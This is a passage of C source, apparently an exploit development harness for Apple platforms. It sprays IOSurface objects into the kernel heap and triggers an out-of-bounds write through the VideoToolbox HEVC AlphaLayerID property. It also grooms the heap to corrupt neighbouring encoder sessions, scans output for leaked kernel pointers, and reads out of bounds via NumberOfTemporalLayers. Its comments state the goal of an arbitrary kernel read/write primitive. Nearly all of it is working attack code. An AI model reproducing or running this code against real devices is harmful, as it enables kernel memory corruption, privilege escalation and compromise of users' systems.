                    int pw = 64, ph = 64, pbpe = 1, pbpr = 64;
                    CFDictionarySetValue(pd, CFSTR("IOSurfacePlaneWidth"),
                        CFNumberCreate(NULL, kCFNumberIntType, &pw));
                    CFDictionarySetValue(pd, CFSTR("IOSurfacePlaneHeight"),
                        CFNumberCreate(NULL, kCFNumberIntType, &ph));
                    CFDictionarySetValue(pd, CFSTR("IOSurfacePlaneBytesPerElement"),
                        CFNumberCreate(NULL, kCFNumberIntType, &pbpe));
                    CFDictionarySetValue(pd, CFSTR("IOSurfacePlaneBytesPerRow"),
                        CFNumberCreate(NULL, kCFNumberIntType, &pbpr));
                    pplanes[j] = pd;
                }
                CFArrayRef pa = CFArrayCreate(NULL, pplanes, np, &kCFTypeArrayCallBacks);
                CFDictionarySetValue(sd, CFSTR("IOSurfacePlaneInfo"), pa);

                IOSurfaceRef ts = IOSurfaceCreate(sd);
                rlog("  %d planes: %s", np, ts ? "OK" : "FAIL");
                if (ts) {
                    rlog(" (alloc=%zu, planes=%zu)", IOSurfaceGetAllocSize(ts), IOSurfaceGetPlaneCount(ts));
                    CFRelease(ts);
                }
                rlog("\n");

                CFRelease(pa);
                for (int j = 0; j < np; j++) CFRelease((CFMutableDictionaryRef)pplanes[j]);
                free(pplanes);
                CFRelease(sd);
            }

            /* Phase 5: IOKit service enumeration */
            rlog("\n--- Phase 5: IOKit IOSurface service check ---\n");
            io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                IOServiceMatching("IOSurfaceRoot"));
            rlog("IOSurfaceRoot service: 0x%x\n", svc);

            if (svc) {
                io_connect_t conn = 0;
                kern_return_t kr2 = IOServiceOpen(svc, mach_task_self(), 0, &conn);
                rlog("IOServiceOpen (type 0): 0x%x (conn=0x%x)\n", kr2, conn);
                if (kr2 == KERN_SUCCESS && conn) {
                    rlog("*** IOSurfaceRootUserClient OPEN FROM SANDBOX ***\n");
                    IOServiceClose(conn);
                }

                /* Try type 1 */
                kr2 = IOServiceOpen(svc, mach_task_self(), 1, &conn);
                rlog("IOServiceOpen (type 1): 0x%x\n", kr2);
                if (kr2 == KERN_SUCCESS && conn) IOServiceClose(conn);

                IOObjectRelease(svc);
            }

            CFRelease(surf);
        }

        CFRelease(props); CFRelease(wn); CFRelease(hn);
        CFRelease(bn); CFRelease(brn); CFRelease(pfn);
        rlog("\n=== IOSURFACE_PROBE complete ===\n");

    } else if (strcmp(mode, "heap_spray_oob") == 0) {
        /*
         * heap_spray_oob — IOSurface heap spray + AlphaLayerID OOB trigger
         *
         * Strategy:
         * 1. Create many IOSurface objects with detectable property patterns
         * 2. Free some to create holes in the kernel heap
         * 3. Trigger VTCompressionSession with OOB AlphaLayerID
         *    (PrepareToEncodeFrames writes past sHEVC_VPS extension arrays)
         * 4. Read back all IOSurface properties to detect corruption
         *
         * If any IOSurface property reads back a different value than what was set,
         * we have confirmed the OOB write hit an IOSurface object — the basis for
         * a full read/write primitive.
         */
        int spray_count = (argc > 2) ? atoi(argv[2]) : 256;
        int oob_aid = (argc > 3) ? atoi(argv[3]) : 128;
        int hole_stride = (argc > 4) ? atoi(argv[4]) : 4;
        if (spray_count < 16) spray_count = 16;
        if (spray_count > 4096) spray_count = 4096;

        rlog("=== HEAP_SPRAY_OOB: IOSurface spray + AlphaLayerID OOB ===\n");
        rlog("Spray: %d surfaces, OOB AlphaLayerID=%d, hole_stride=%d\n\n", spray_count, oob_aid, hole_stride);

        IOSurfaceRef *surfs = calloc(spray_count, sizeof(IOSurfaceRef));
        if (!surfs) { rlog("FAIL: calloc for spray array\n"); goto done; }

        /* Phase 1: Spray IOSurface objects with sentinel properties */
        rlog("--- Phase 1: Spray %d IOSurface objects ---\n", spray_count);
        int created = 0;
        for (int i = 0; i < spray_count; i++) {
            int sw = 64, sh = 64, sbpp = 4, sbpr = sw * sbpp;
            CFNumberRef swn = CFNumberCreate(NULL, kCFNumberIntType, &sw);
            CFNumberRef shn = CFNumberCreate(NULL, kCFNumberIntType, &sh);
            CFNumberRef sbn = CFNumberCreate(NULL, kCFNumberIntType, &sbpp);
            CFNumberRef sbrn = CFNumberCreate(NULL, kCFNumberIntType, &sbpr);
            int pf = 0x42475241; /* BGRA */
            CFNumberRef spfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), swn);
            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), shn);
            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerElement"), sbn);
            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), sbrn);
            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), spfn);

            surfs[i] = IOSurfaceCreate(sp);
            CFRelease(sp); CFRelease(swn); CFRelease(shn);
            CFRelease(sbn); CFRelease(sbrn); CFRelease(spfn);

            if (surfs[i]) {
                /* Set sentinel: "MAGIC" key with value = index */
                int sentinel = 0xDEAD0000 | i;
                CFNumberRef sn = CFNumberCreate(NULL, kCFNumberIntType, &sentinel);
                IOSurfaceSetValue(surfs[i], CFSTR("MAGIC"), sn);
                CFRelease(sn);
                /* Set a second sentinel for double-checking */
                int check = ~sentinel;
                CFNumberRef cn = CFNumberCreate(NULL, kCFNumberIntType, &check);
                IOSurfaceSetValue(surfs[i], CFSTR("CHECK"), cn);
                CFRelease(cn);
                created++;
            }
        }
        rlog("Created: %d / %d surfaces\n", created, spray_count);

        /* Phase 2: Poke holes by freeing every Nth surface */
        rlog("\n--- Phase 2: Create holes (free every %dth) ---\n", hole_stride);
        int freed = 0;
        for (int i = hole_stride / 2; i < spray_count; i += hole_stride) {
            if (surfs[i]) {
                CFRelease((CFTypeRef)surfs[i]);
                surfs[i] = NULL;
                freed++;
            }
        }
        rlog("Freed %d surfaces (holes created)\n", freed);

        /* Phase 3: Trigger OOB AlphaLayerID write */
        rlog("\n--- Phase 3: Trigger OOB AlphaLayerID=%d ---\n", oob_aid);
        int trigger_count = 0;
        for (int t = 0; t < 8; t++) {
            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            OSStatus st = VTCompressionSessionCreate(NULL, 192, 192,
                (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
                encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) { rlog("  trigger[%d]: create fail\n", t); continue; }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &oob_aid);
            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
            CFRelease(aidn);

            st = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("  trigger[%d]: prepare=%d", t, (int)st);
            if (st == noErr) trigger_count++;

            /* Also try encode (may fail but kernel write already happened in prepare) */
            if (st == noErr) {
                g_encode_done = 0; g_cb_status = -999;
                CVPixelBufferRef pb = NULL;
                CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
                if (pb) {
                    CVPixelBufferLockBaseAddress(pb, 0);
                    void *base = CVPixelBufferGetBaseAddress(pb);
                    if (base) memset(base, 0x41, CVPixelBufferGetDataSize(pb));
                    CVPixelBufferUnlockBaseAddress(pb, 0);
                    CMTime pts = CMTimeMake(t, 30);
                    VTCompressionSessionEncodeFrame(s, pb, pts, kCMTimeInvalid, NULL, NULL, NULL);
                    for (int ww = 0; ww < 200 && !g_encode_done; ww++) usleep(10000);
                    rlog(" enc=%d", (int)g_cb_status);
                    CVPixelBufferRelease(pb);
                }
            }
            rlog("\n");

            VTCompressionSessionInvalidate(s);
            CFRelease(s);
        }
        rlog("Successful prepare calls: %d / 8\n", trigger_count);

        /* Phase 4: Check all IOSurface sentinels for corruption */
        rlog("\n--- Phase 4: Check IOSurface sentinels for corruption ---\n");
        int corrupted = 0, checked = 0;
        for (int i = 0; i < spray_count; i++) {
            if (!surfs[i]) continue;
            checked++;

            int expected_magic = 0xDEAD0000 | i;
            int expected_check = ~expected_magic;

            CFNumberRef mn = (CFNumberRef)IOSurfaceCopyValue(surfs[i], CFSTR("MAGIC"));
            CFNumberRef cn = (CFNumberRef)IOSurfaceCopyValue(surfs[i], CFSTR("CHECK"));

            int got_magic = 0, got_check = 0;
            int has_magic = 0, has_check = 0;
            if (mn && CFGetTypeID(mn) == CFNumberGetTypeID()) {
                CFNumberGetValue(mn, kCFNumberIntType, &got_magic);
                has_magic = 1;
            }
            if (cn && CFGetTypeID(cn) == CFNumberGetTypeID()) {
                CFNumberGetValue(cn, kCFNumberIntType, &got_check);
                has_check = 1;
            }

            int bad = 0;
            if (!has_magic || got_magic != expected_magic) bad = 1;
            if (!has_check || got_check != expected_check) bad = 1;

            if (bad) {
                corrupted++;
                rlog("  *** CORRUPTED surf[%d]: ", i);
                if (has_magic) rlog("magic=0x%08x (expected 0x%08x) ", got_magic, expected_magic);
                else rlog("magic=MISSING ");
                if (has_check) rlog("check=0x%08x (expected 0x%08x)", got_check, expected_check);
                else rlog("check=MISSING");
                rlog(" ***\n");
            }

            if (mn) CFRelease(mn);
            if (cn) CFRelease(cn);
        }
        rlog("\nResults: checked=%d, corrupted=%d / %d\n", checked, corrupted, checked);
        if (corrupted > 0)
            rlog("*** HEAP CORRUPTION DETECTED — OOB write hit IOSurface data ***\n");
        else
            rlog("No corruption detected (OOB may target different heap zone)\n");

        /* Phase 5: Check surface metadata for corruption */
        rlog("\n--- Phase 5: Surface metadata integrity check ---\n");
        int meta_bad = 0;
        for (int i = 0; i < spray_count; i++) {
            if (!surfs[i]) continue;
            size_t gw = IOSurfaceGetWidth(surfs[i]);
            size_t gh = IOSurfaceGetHeight(surfs[i]);
            size_t ga = IOSurfaceGetAllocSize(surfs[i]);
            if (gw != 64 || gh != 64 || ga != 16384) {
                meta_bad++;
                rlog("  *** METADATA CORRUPTED surf[%d]: w=%zu h=%zu alloc=%zu ***\n",
                    i, gw, gh, ga);
            }
        }
        rlog("Metadata check: %d corrupted\n", meta_bad);
        if (meta_bad > 0)
            rlog("*** SURFACE METADATA CORRUPTED — potential arbitrary R/W ***\n");

        /* Cleanup */
        for (int i = 0; i < spray_count; i++)
            if (surfs[i]) CFRelease((CFTypeRef)surfs[i]);
        free(surfs);

        rlog("\n=== HEAP_SPRAY_OOB complete ===\n");

    } else if (strcmp(mode, "oob_crash_scan") == 0) {
        /*
         * oob_crash_scan — Find which OOB index hits critical struct fields
         *
         * Creates VTCompressionSession with each AlphaLayerID from 64 to max,
         * calls PrepareToEncodeFrames (which does the OOB write), then
         * invalidates. If a specific index corrupts a function pointer or
         * critical field, the process may crash — the last logged index
         * tells us which offset is critical.
         *
         * Uses regular HEVC codec. Each session gets its own sHEVC_VPS
         * allocation, so corruption is isolated per-session.
         *
         * Safety: each session is created then immediately invalidated,
         * limiting the window for the corrupted state to cause issues.
         */
        int start_aid = (argc > 2) ? atoi(argv[2]) : 64;
        int end_aid = (argc > 3) ? atoi(argv[3]) : 255;
        int use_muxa = (argc > 4) ? atoi(argv[4]) : 0;
        if (start_aid < 0) start_aid = 0;
        if (end_aid > 255) end_aid = 255;

        rlog("=== OOB_CRASH_SCAN: Probe OOB indices %d-%d ===\n", start_aid, end_aid);
        rlog("Codec: %s, resolution: 192x192\n\n", use_muxa ? "muxa" : "HEVC");

        CMVideoCodecType codec = use_muxa ?
            (CMVideoCodecType)0x6D757861 : kCMVideoCodecType_HEVC;

        for (int aid = start_aid; aid <= end_aid; aid++) {
            rlog("AID=%3d: ", aid);

            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(enc_spec,
                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            if (!use_muxa)
                CFDictionarySetValue(enc_spec,
                    CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);

            OSStatus st = VTCompressionSessionCreate(NULL, 192, 192,
                codec, enc_spec, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(enc_spec);
            if (st != noErr || !s) { rlog("create=%d SKIP\n", (int)st); continue; }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
            OSStatus sp = VTSessionSetProperty(s,
                CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
            CFRelease(aidn);

            st = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("set=%d prep=%d", (int)sp, (int)st);

            if (st == noErr) {
                /* Try a quick encode to exercise the corrupted state */
                g_encode_done = 0; g_cb_status = -999;
                CVPixelBufferRef pb = NULL;
                CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
                if (pb) {
                    CVPixelBufferLockBaseAddress(pb, 0);
                    void *base = CVPixelBufferGetBaseAddress(pb);
                    if (base) memset(base, 0x42, CVPixelBufferGetDataSize(pb));
                    CVPixelBufferUnlockBaseAddress(pb, 0);
                    CMTime pts = CMTimeMake(0, 30);
                    VTCompressionSessionEncodeFrame(s, pb, pts, kCMTimeInvalid, NULL, NULL, NULL);
                    for (int ww = 0; ww < 100 && !g_encode_done; ww++) usleep(10000);
                    rlog(" enc=%d", (int)g_cb_status);
                    CVPixelBufferRelease(pb);
                }
            }
            rlog(" OK\n");

            VTCompressionSessionInvalidate(s);
            CFRelease(s);
            usleep(20000); /* 20ms between sessions */
        }

        rlog("\n=== OOB_CRASH_SCAN complete (all indices survived) ===\n");

    } else if (strcmp(mode, "heap_feng_shui") == 0) {
        /*
         * heap_feng_shui — Cross-session VPS corruption via OOB write
         *
         * Uses the CONFIRMED OOB path: EncodesAlpha + RequiredHEVCVideoParameterSetAlphaLayerID
         * Both victims (AID=1, in-bounds) and attackers (AID=high, OOB) use this path
         * so they allocate sHEVC_VPS in the same kalloc bucket.
         *
         * Memory layout after spray+punch+fill:
         *   [A0][V1][A1][V3][A2][V5]...
         * A0's OOB write extends forward, potentially into V1's allocation.
         */
        int spray_count = (argc > 2) ? atoi(argv[2]) : 12;
        int oob_aid = (argc > 3) ? atoi(argv[3]) : 128;
        if (spray_count < 4) spray_count = 4;
        if (spray_count > 32) spray_count = 32;
        if (oob_aid < 64) oob_aid = 64;
        if (oob_aid > 255) oob_aid = 255;

        int vw = 192, vh = 192;
        rlog("=== HEAP_FENG_SHUI: Cross-session VPS corruption ===\n");
        rlog("Spray: %d sessions, Attacker AID=%d, Victim AID=1, res=%dx%d\n\n",
             spray_count, oob_aid, vw, vh);

        VTCompressionSessionRef *sessions = calloc(spray_count, sizeof(VTCompressionSessionRef));
        uint8_t (*baseline_vps)[256] = calloc(spray_count, 256);
        size_t *baseline_lens = calloc(spray_count, sizeof(size_t));
        if (!sessions || !baseline_vps || !baseline_lens) {
            rlog("FAIL: calloc\n"); goto done;
        }

        /* Helper: create EncodesAlpha session with given AID */
        #define CREATE_ALPHA_SESSION(w_, h_, aid_val, out_s) do { \
            VTCompressionSessionRef s_ = NULL; \
            CFMutableDictionaryRef es_ = CFDictionaryCreateMutable(NULL, 0, \
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks); \
            CFDictionarySetValue(es_, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue); \
            CFDictionarySetValue(es_, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue); \
            OSStatus cs_ = VTCompressionSessionCreate(NULL, w_, h_, \
                kCMVideoCodecType_HEVC, es_, NULL, NULL, encode_cb, NULL, &s_); \
            CFRelease(es_); \
            if (cs_ == noErr && s_) { \
                VTSessionSetProperty(s_, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue); \
                VTSessionSetProperty(s_, CFSTR("EncodesAlpha"), kCFBooleanTrue); \
                int av_ = (aid_val); \
                CFNumberRef an_ = CFNumberCreate(NULL, kCFNumberIntType, &av_); \
                VTSessionSetProperty(s_, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), an_); \
                CFRelease(an_); \
                cs_ = VTCompressionSessionPrepareToEncodeFrames(s_); \
                if (cs_ != noErr) { VTCompressionSessionInvalidate(s_); CFRelease(s_); s_ = NULL; } \
            } else { s_ = NULL; } \
            (out_s) = s_; \
        } while(0)

        /* Phase 0: Warmup — allocate and free sessions to fill kalloc slab */
        rlog("--- Phase 0: Warmup (prime kalloc slab) ---\n");
        {
            VTCompressionSessionRef warmup[16];
            int nw = 0;
            for (int i = 0; i < 16; i++) {
                CREATE_ALPHA_SESSION(vw, vh, 1, warmup[i]);
                if (warmup[i]) nw++;
            }
            for (int i = 0; i < 16; i++)
                if (warmup[i]) { VTCompressionSessionInvalidate(warmup[i]); CFRelease(warmup[i]); }
            rlog("Warmed up %d sessions\n\n", nw);
            usleep(50000);
        }

        /* Phase 1: Create spray sessions with AID=1 (in-bounds, produces valid VPS) */
        rlog("--- Phase 1: Spray %d encoder sessions (AID=1) ---\n", spray_count);
        int created = 0;
        for (int i = 0; i < spray_count; i++) {
            rlog("  S[%2d]: ", i);
            CREATE_ALPHA_SESSION(vw, vh, 1, sessions[i]);
            if (!sessions[i]) { rlog("FAIL\n"); continue; }
            created++;

            g_encode_done = 0; g_cb_status = -999;
            g_cb_had_fmt = 0;
            if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
            CVPixelBufferRef pb = create_pb(vw, vh);
            if (pb) {
                CMTime pts = CMTimeMake(i, 30);
                VTCompressionSessionEncodeFrame(sessions[i], pb, pts, kCMTimeInvalid, NULL, NULL, NULL);
                VTCompressionSessionCompleteFrames(sessions[i], kCMTimeInvalid);
                for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
                CVPixelBufferRelease(pb);
            }
            if (g_saved_fmt) {
                const uint8_t *ptr = NULL;
                size_t sz = 0;
                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    g_saved_fmt, 0, &ptr, &sz, NULL, NULL);
                if (ptr && sz > 0 && sz <= 256) {
                    memcpy(baseline_vps[i], ptr, sz);
                    baseline_lens[i] = sz;
                }
                CFRelease(g_saved_fmt); g_saved_fmt = NULL;
            }
            rlog("enc=%d vps=%zu bytes\n", (int)g_cb_status, baseline_lens[i]);
            usleep(30000);
        }
        rlog("Created: %d / %d\n\n", created, spray_count);

        /* Phase 2: Destroy even-indexed sessions to create holes */
        rlog("--- Phase 2: Punch holes (destroy even-indexed) ---\n");
        int freed = 0;
        for (int i = 0; i < spray_count; i += 2) {
            if (sessions[i]) {
                VTCompressionSessionInvalidate(sessions[i]);
                CFRelease(sessions[i]);
                sessions[i] = NULL;
                baseline_lens[i] = 0;
                freed++;
            }
        }
        rlog("Freed %d sessions\n", freed);
        usleep(200000); /* 200ms for allocator */

        /* Phase 3: Fill holes with attacker sessions (high AID = OOB write) */
        rlog("\n--- Phase 3: Create %d attacker sessions (AID=%d) ---\n", freed, oob_aid);
        VTCompressionSessionRef *attackers = calloc(freed, sizeof(VTCompressionSessionRef));
        int attack_count = 0;
        for (int t = 0; t < freed; t++) {
            rlog("  A[%2d]: ", t);
            CREATE_ALPHA_SESSION(vw, vh, oob_aid, attackers[t]);
            if (attackers[t]) {
                attack_count++;
                rlog("OK (OOB write at AID=%d)\n", oob_aid);
            } else {
                rlog("FAIL\n");
            }
        }
        rlog("Attackers: %d / %d\n\n", attack_count, freed);

        /* Phase 4: Re-encode ALL surviving victims and compare VPS */
        rlog("--- Phase 4: Re-encode victims, check VPS corruption ---\n");
        int checked = 0, corrupted = 0, lost_fmt_count = 0;
        for (int i = 1; i < spray_count; i += 2) {
            if (!sessions[i] || baseline_lens[i] == 0) continue;
            checked++;

            g_encode_done = 0; g_cb_status = -999;
            g_cb_had_fmt = 0;
            if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
            CVPixelBufferRef pb = create_pb(vw, vh);
            if (pb) {
                CMTime pts = CMTimeMake(1000 + i, 30);
                VTCompressionSessionEncodeFrame(sessions[i], pb, pts, kCMTimeInvalid, NULL, NULL, NULL);
                VTCompressionSessionCompleteFrames(sessions[i], kCMTimeInvalid);
                for (int ww = 0; ww < 300 && !g_encode_done; ww++) usleep(10000);
                CVPixelBufferRelease(pb);
            }

            if (!g_saved_fmt) {
                lost_fmt_count++;
                rlog("  V[%2d]: *** LOST FORMAT DESC (fmt=NULL after attacker OOB!) ***\n", i);
                continue;
            }

            const uint8_t *ptr = NULL;
            size_t sz = 0;
            OSStatus st = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                g_saved_fmt, 0, &ptr, &sz, NULL, NULL);

            if (st != 0 || !ptr || sz == 0) {
                lost_fmt_count++;
                rlog("  V[%2d]: no VPS pset (st=%d)\n", i, (int)st);
            } else {
                int diffs = 0;
                if (sz != baseline_lens[i]) {
                    diffs = -1;
                } else {
                    for (size_t j = 0; j < sz; j++)
                        if (ptr[j] != baseline_vps[i][j]) diffs++;
                }
                if (diffs != 0) {
                    corrupted++;
                    rlog("  *** CORRUPTED V[%2d]: ", i);
                    if (diffs == -1) rlog("LEN %zu->%zu\n", baseline_lens[i], sz);
                    else rlog("%d byte diffs\n", diffs);
                    rlog("    base: ");
                    for (size_t j = 0; j < baseline_lens[i] && j < 64; j++)
                        rlog("%02x", baseline_vps[i][j]);
                    rlog("\n    now:  ");
                    for (size_t j = 0; j < sz && j < 64; j++)
                        rlog("%02x", ptr[j]);
                    rlog("\n    at:   ");
                    size_t cl = (sz < baseline_lens[i]) ? sz : baseline_lens[i];
                    for (size_t j = 0; j < cl; j++)
                        if (ptr[j] != baseline_vps[i][j])
                            rlog("[%zu]%02x>%02x ", j, baseline_vps[i][j], ptr[j]);
                    rlog("\n");
                    if (sz >= 8) {
                        for (size_t j = 0; j <= sz - 8; j += 4) {
                            uint64_t qw; memcpy(&qw, ptr + j, 8);
                            if ((qw >> 40) == 0xfffffe || (qw >> 40) == 0xffff80)
                                rlog("    *** KPTR@%zu: 0x%016llx ***\n", j, (unsigned long long)qw);
                        }
                    }
                } else {
                    rlog("  V[%2d]: unchanged (%zu bytes)\n", i, sz);
                }
            }
            if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
        }

        rlog("\n=== RESULTS ===\n");
        rlog("Victims checked: %d, corrupted: %d, lost_fmt: %d\n",
             checked, corrupted, lost_fmt_count);
        if (corrupted > 0)
            rlog("*** CROSS-SESSION VPS CORRUPTION CONFIRMED ***\n");
        else if (lost_fmt_count > 0)
            rlog("*** VICTIMS LOST FMT — possible cross-session damage ***\n");
        else
            rlog("No cross-session corruption (OOB likely stays within struct)\n");

        for (int i = 0; i < spray_count; i++)
            if (sessions[i]) { VTCompressionSessionInvalidate(sessions[i]); CFRelease(sessions[i]); }
        for (int i = 0; i < freed; i++)
            if (attackers[i]) { VTCompressionSessionInvalidate(attackers[i]); CFRelease(attackers[i]); }
        free(sessions); free(baseline_vps); free(baseline_lens); free(attackers);
        #undef CREATE_ALPHA_SESSION

        rlog("\n=== HEAP_FENG_SHUI complete ===\n");

    } else if (strcmp(mode, "dimension_oob") == 0) {
        /*
         * dimension_oob — Info leak via NumberOfTemporalLayers OOB
         *
         * dimension_id[64][16] stores per-layer dimension IDs.
         * NumberOfTemporalLayers controls the temporal dimension count.
         * If TL > 15, PSGen reads dimension_id[layer][TL] past the
         * 16-element bound, pulling adjacent struct data into VPS output.
         *
         * Combined with low AID (in-bounds), this keeps VPS generation
         * active while dimension reads go OOB.
         */
        int max_tl = (argc > 2) ? atoi(argv[2]) : 32;
        int aid = (argc > 3) ? atoi(argv[3]) : 1;
        if (max_tl < 1) max_tl = 1;
        if (max_tl > 255) max_tl = 255;
        if (aid < 0) aid = 0;
        if (aid > 62) aid = 62;

        int vw = 192, vh = 192;
        rlog("=== DIMENSION_OOB: Info leak via NumberOfTemporalLayers ===\n");
        rlog("TL range: 1-%d, AID=%d, res=%dx%d\n\n", max_tl, aid, vw, vh);

        /* Get baseline VPS at TL=1 */
        uint8_t baseline[512];
        size_t blen = 0;
        {
            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(es);
            if (cs == noErr && s) {
                VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
                int av = aid;
                CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &av);
                VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), an);
                CFRelease(an);
                int tl = 1;
                CFNumberRef tn = CFNumberCreate(NULL, kCFNumberIntType, &tl);
                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), tn);
                CFRelease(tn);
                VTCompressionSessionPrepareToEncodeFrames(s);

                g_encode_done = 0; g_cb_status = -999; g_cb_had_fmt = 0;
                if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
                CVPixelBufferRef pb = create_pb(vw, vh);
                if (pb) {
                    VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0,30), kCMTimeInvalid, NULL, NULL, NULL);
                    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                    for (int w = 0; w < 300 && !g_encode_done; w++) usleep(10000);
                    CVPixelBufferRelease(pb);
                }
                if (g_saved_fmt) {
                    const uint8_t *p = NULL; size_t sz = 0;
                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(g_saved_fmt, 0, &p, &sz, NULL, NULL);
                    if (p && sz > 0 && sz <= 512) { memcpy(baseline, p, sz); blen = sz; }
                    CFRelease(g_saved_fmt); g_saved_fmt = NULL;
                }
                VTCompressionSessionInvalidate(s); CFRelease(s);
            }
        }
        rlog("Baseline (TL=1): %zu bytes\n", blen);
        if (blen > 0) {
            rlog("  ");
            for (size_t j = 0; j < blen && j < 64; j++) rlog("%02x", baseline[j]);
            rlog("\n");
        }
        rlog("\n");

        /* Scan TL=1..max_tl */
        for (int tl = 1; tl <= max_tl; tl++) {
            VTCompressionSessionRef s = NULL;
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            OSStatus cs = VTCompressionSessionCreate(NULL, vw, vh,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(es);
            if (cs != noErr || !s) {
                rlog("TL=%3d: create FAIL\n", tl);
                continue;
            }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
            int av = aid;
            CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &av);
            VTSessionSetProperty(s, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), an);
            CFRelease(an);
            CFNumberRef tn = CFNumberCreate(NULL, kCFNumberIntType, &tl);
            VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), tn);
            CFRelease(tn);

            OSStatus ps = VTCompressionSessionPrepareToEncodeFrames(s);

            g_encode_done = 0; g_cb_status = -999; g_cb_had_fmt = 0;
            if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }

            CVPixelBufferRef pb = create_pb(vw, vh);
            if (pb) {
                VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(tl, 30), kCMTimeInvalid, NULL, NULL, NULL);
                VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
                for (int w = 0; w < 300 && !g_encode_done; w++) usleep(10000);
                CVPixelBufferRelease(pb);
            }

            size_t vlen = 0;
            uint8_t vps[512];
            int has_fmt = 0;
            if (g_saved_fmt) {
                has_fmt = 1;
                const uint8_t *p = NULL; size_t sz = 0;
                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(g_saved_fmt, 0, &p, &sz, NULL, NULL);
                if (p && sz > 0 && sz <= 512) { memcpy(vps, p, sz); vlen = sz; }
                CFRelease(g_saved_fmt); g_saved_fmt = NULL;
            }

            int diffs = 0;
            if (vlen > 0 && blen > 0) {
                if (vlen != blen) diffs = -1;
                else for (size_t j = 0; j < vlen; j++)
                    if (vps[j] != baseline[j]) diffs++;
            }

